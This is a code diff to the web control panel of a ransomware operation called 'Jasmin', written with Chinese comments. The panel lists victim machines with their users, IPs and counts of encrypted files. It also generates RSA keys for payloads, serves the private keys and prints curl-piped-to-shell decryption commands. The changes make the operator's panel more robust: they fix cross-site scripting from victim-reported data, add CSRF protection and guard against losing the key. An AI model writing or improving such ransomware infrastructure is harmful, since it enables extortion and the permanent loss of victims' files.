@@ -208,7 +208,7 @@ Contact us to obtain the private key and restore your files.</textarea>
   <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
   <td><?=h($row['computer_user'])?></td><td><span class="os-badge"><?=h($row['os'])?></span></td>
   <td><?=h($row['ip'])?></td><td><?=h($row['date'])?></td>
-  <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" onclick="event.preventDefault();showFileDetail(<?=$vid?>,'<?=$ed?>')"><?=$ec?> 个</a></td>
+  <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" data-det="<?=h($row['encrypted_detail']??'{}')?>" onclick="event.preventDefault();showFileDetail(<?=$vid?>,this)"><?=$ec?> 个</a></td>
   <td style="color:#4dc3fa"><?=$sz_str?></td>
   <td style="min-width:150px">
     <div style="display:flex;align-items:center;gap:8px">
@@ -225,7 +225,7 @@ Contact us to obtain the private key and restore your files.</textarea>
   <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all"><?=$et?></span></td>
   <td style="white-space:nowrap">
     <?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm" title="下载密钥"><i class="fas fa-key"></i></a><?php endif;?>
-    <button class="btn-sm" style="background:#10b981" onclick="showDecrypt('<?=$vid?>','<?=h($row['ip'])?>',<?=$is_linux?'true':'false'?>)" title="一键解密"><i class="fas fa-unlock"></i></button>
+    <button class="btn-sm" style="background:#10b981" data-ip="<?=h($row['ip'])?>" data-linux="<?=$is_linux?'1':'0'?>" onclick="showDecrypt('<?=$vid?>',this)" title="一键解密"><i class="fas fa-unlock"></i></button>
   </td>
 </tr>
 <?php if(isset($_GET['dec'])&&$_GET['dec']==$vid):?>
@@ -233,7 +233,7 @@ Contact us to obtain the private key and restore your files.</textarea>
 <?php if($is_linux):?>
 <pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 openssl 零依赖
 curl -sL <?=$server_url?>/payloads/jasmin_unlock.sh | sh -s <?=$server_url?> "<?=$aes_pwd?>"
-# 末尾换成要解密的目录，不写则解密当前目录</pre>
+# 不写目录 = 解密全部加密文件；只解特定目录时在末尾追加，如: /data /home</pre>
 <?php else:?>
 <pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 PowerShell，无需编译 exe
 :: 要求 PowerShell 7+  (未装可执行: winget install Microsoft.PowerShell)
@@ -315,7 +315,9 @@ function checkUpdate(){
 function doUpdate(){
   var r=document.getElementById('update-result');
   r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在更新，请勿刷新...</span>';
-  fetch('update.php?action=update').then(x=>x.json()).then(d=>{
+  // 必须 POST + CSRF —— 后端要求 POST，此前用默认 GET，导致「一键更新」从未成功过
+  fetch('update.php?action=update',{method:'POST',
+    body:new URLSearchParams({csrf_token:'<?=$csrf?>'})}).then(x=>x.json()).then(d=>{
     if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 更新完成 ('+d.method+')<br><pre style="margin-top:8px;font-size:.78rem;color:#94a3b8">'+(d.output||d.msg)+'</pre><br><a href="dashboard.php" class="btn btn-red" style="display:inline-flex;margin-top:8px"><i class="fas fa-redo"></i> 刷新页面</a></div>';}
     else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
   }).catch(e=>{r.innerHTML='<div class="gen-err">更新失败: '+e+'</div>';});
@@ -335,49 +337,90 @@ function showTab(t){
   event.target.closest('.nav-item').classList.add('active');
 }
 var _detOpen=null;
-function showFileDetail(vid,jsonStr){
-  if(_detOpen){_detOpen.remove();if(_detOpen.dataset.vid==vid){_detOpen=null;return;}_detOpen=null;}
+// 明细表全部用 DOM API + textContent 构建：encrypted_detail 的来源是
+// 握手接口上报的被控端数据，属于外部输入，绝不能拼进 innerHTML
+// （此前用 innerHTML 拼 JSON 的 key，持有握手密钥者即可投毒 XSS）。
+function showFileDetail(vid,el){
+  if(_detOpen){_detOpen.remove();if(_detOpen.dataset.vid==String(vid)){_detOpen=null;return;}_detOpen=null;}
+  var jsonStr=el.dataset.det||'{}';
   var d;try{d=JSON.parse(jsonStr);}catch(e){d={};}
   var keys=Object.keys(d).sort();
   if(!keys.length){return;}
   function fmtSz(b){if(b>=1073741824)return (b/1073741824).toFixed(2)+' GB';if(b>=1048576)return (b/1048576).toFixed(2)+' MB';if(b>=1024)return (b/1024).toFixed(2)+' KB';return b+' B';}
-  var h='<table style="width:100%;font-size:.8rem;border-collapse:collapse"><thead><tr style="color:var(--accent2)"><th style="text-align:left;padding:6px 10px">文件类型</th><th style="text-align:right;padding:6px 10px">数量</th><th style="text-align:right;padding:6px 10px">大小</th><th style="padding:6px 10px">占比</th></tr></thead><tbody>';
+  var table=document.createElement('table');
+  table.style.cssText='width:100%;font-size:.8rem;border-collapse:collapse';
+  var thead=document.createElement('thead');
+  var hr=document.createElement('tr');hr.style.color='var(--accent2)';
+  [['文件类型','left'],['数量','right'],['大小','right'],['占比','left']].forEach(function(c){
+    var th=document.createElement('th');th.textContent=c[0];
+    th.style.cssText='text-align:'+c[1]+';padding:6px 10px';hr.appendChild(th);
+  });
+  thead.appendChild(hr);table.appendChild(thead);
+  var tbody=document.createElement('tbody');
   var total=0;keys.forEach(function(k){total+=d[k].count;});
   keys.forEach(function(k){
     var pct=total?Math.round(d[k].count/total*100):0;
-    var bar='<div style="background:var(--surface2);border-radius:4px;height:8px;width:80px;display:inline-block"><div style="background:var(--accent2);height:8px;border-radius:4px;width:'+pct+'%"></div></div>';
-    h+='<tr style="border-top:1px solid var(--border)"><td style="padding:5px 10px;color:#f59e0b;font-weight:600">'+k+'</td><td style="text-align:right;padding:5px 10px">'+d[k].count+' 个</td><td style="text-align:right;padding:5px 10px;color:#4dc3fa">'+fmtSz(d[k].size)+'</td><td style="padding:5px 10px">'+bar+' '+pct+'%</td></tr>';
+    var tr2=document.createElement('tr');tr2.style.borderTop='1px solid var(--border)';
+    var td1=document.createElement('td');td1.textContent=k;               // ← textContent，不解析 HTML
+    td1.style.cssText='padding:5px 10px;color:#f59e0b;font-weight:600';
+    var td2=document.createElement('td');td2.textContent=d[k].count+' 个';
+    td2.style.cssText='text-align:right;padding:5px 10px';
+    var td3=document.createElement('td');td3.textContent=fmtSz(d[k].size);
+    td3.style.cssText='text-align:right;padding:5px 10px;color:#4dc3fa';
+    var td4=document.createElement('td');td4.style.cssText='padding:5px 10px';
+    var wrap=document.createElement('div');
+    wrap.style.cssText='background:var(--surface2);border-radius:4px;height:8px;width:80px;display:inline-block';
+    var inner=document.createElement('div');
+    inner.style.cssText='background:var(--accent2);height:8px;border-radius:4px;width:'+pct+'%';
+    wrap.appendChild(inner);
+    td4.appendChild(wrap);td4.appendChild(document.createTextNode(' '+pct+'%'));
+    tr2.appendChild(td1);tr2.appendChild(td2);tr2.appendChild(td3);tr2.appendChild(td4);
+    tbody.appendChild(tr2);
   });
-  h+='</tbody></table>';
-  var btns=document.querySelectorAll('a[onclick*="showFileDetail"]');
-  var tr=null;for(var b of btns){if(b.onclick.toString().indexOf(vid+',' )>-1){tr=b.closest('tr');break;}}
+  table.appendChild(tbody);
+  var tr=el.closest('tr');
   if(!tr)return;
-  var nr=document.createElement('tr');nr.dataset.vid=vid;
-  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';td.innerHTML=h;
+  var nr=document.createElement('tr');nr.dataset.vid=String(vid);
+  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
+  td.appendChild(table);
   nr.appendChild(td);tr.after(nr);_detOpen=nr;
 }
 
 var _decOpen=null;
 var _aesKey='<?php echo file_exists(__DIR__."/payloads/.key_secret")?trim(file_get_contents(__DIR__."/payloads/.key_secret")):"KEY_NOT_SET";?>';
-function showDecrypt(vid,ip,isLinux){
+// ip 来自被控端上报（外部输入），一律经 dataset + textContent 渲染，
+// 不拼 innerHTML；命令模板与后台「解密教程」保持一致（默认解密全部加密文件）。
+function showDecrypt(vid,el){
+  var ip=el.dataset.ip||'', isLinux=el.dataset.linux==='1';
   var srv=location.origin;var k=_aesKey;
-  if(_decOpen){_decOpen.remove();if(_decOpen.dataset.vid==vid){_decOpen=null;return;}_decOpen=null;}
-  var tr=document.querySelector('tr:has(button[onclick*="showDecrypt(\''+vid+'\'"])');
+  if(_decOpen){_decOpen.remove();if(_decOpen.dataset.vid==String(vid)){_decOpen=null;return;}_decOpen=null;}
+  var tr=el.closest('tr');
   if(!tr)return;
-  var nr=document.createElement('tr');nr.dataset.vid=vid;
+  var nr=document.createElement('tr');nr.dataset.vid=String(vid);
   var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
-  if(isLinux){
-    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' \"'+k+'\"\\n# 不写目录 = 解密全部加密文件\\n# 只解特定目录时在末尾追加，如: /data /home</pre>';
-  }else{
-    td.innerHTML='<pre class="dt-code">:: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\\n:: 要求 PowerShell 7+  (winget install Microsoft.PowerShell)\\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K \"'+k+'\" -Paths C:\\\\path\\\\to\\\\decrypt</pre>';
-  }
+  var pre=document.createElement('pre');pre.className='dt-code';
+  pre.textContent = isLinux
+    ? '# '+ip+' 一键解密 — 纯 openssl 零依赖\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'"\n# 不写目录 = 解密全部加密文件；只解特定目录时在末尾追加，如: /data /home'
+    : ':: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\n:: 要求 PowerShell 7+  (未装可执行: winget install Microsoft.PowerShell)\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K "'+k+'"\n:: 不写 -Paths = 解密全部加密文件';
+  td.appendChild(pre);
   nr.appendChild(td);tr.after(nr);_decOpen=nr;
 }
 
-function genKey(){
+function genKey(force){
   var r=document.getElementById('key-result');
   r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
-  fetch('keygen.php',{method:'POST',body:new URLSearchParams({csrf_token:'<?=$csrf?>'})}).then(x=>x.json()).then(d=>{
+  var fd=new URLSearchParams({csrf_token:'<?=$csrf?>'});
+  if(force)fd.append('force','1');
+  fetch('keygen.php',{method:'POST',body:fd}).then(x=>x.json()).then(d=>{
+    // 服务端发现已有密钥：先让操作员明确确认再带 force 重试
+    if(d.need_confirm){
+      if(confirm('⚠️ 危险操作\n\n已有密钥对'+(d.key_id?' (ID: '+d.key_id+')':'')+'。\n\n重新生成后，此前所有已加密的受害者数据将【永久无法解密】。\n旧密钥会被归档为 .bak 文件，但受害者文件仍需旧私钥才能恢复。\n\n确定要重新生成吗？')){
+        genKey(true);
+      }else{
+        r.innerHTML='<div class="gen-err"><i class="fas fa-ban"></i> 已取消，密钥未变动</div>';
+      }
+      return;
+    }
     if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥 (内置到载荷模板):</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="download_file.php?file=payloads%2Fjasmin_private.pem" class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="download_file.php?file=payloads%2Fjasmin_private.pem.enc" class="btn btn-red" style="display:inline-flex;background:#f59e0b"><i class="fas fa-lock"></i> 下载加密私钥</a> <a href="download_file.php?file=payloads%2F.key_secret" class="btn btn-red" style="display:inline-flex;background:#8b5cf6"><i class="fas fa-unlock-alt"></i> 下载解密口令</a> <a href="download_file.php?file=payloads%2Fjasmin_public.pem" class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a> <span style="font-size:.76rem;color:#94a3b8;margin-left:10px">刷新页面可见顶部「密钥管理」</span></div></div>';}
     else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
   }).catch(e=>{r.innerHTML='<div class="gen-err">'+e+'</div>';});
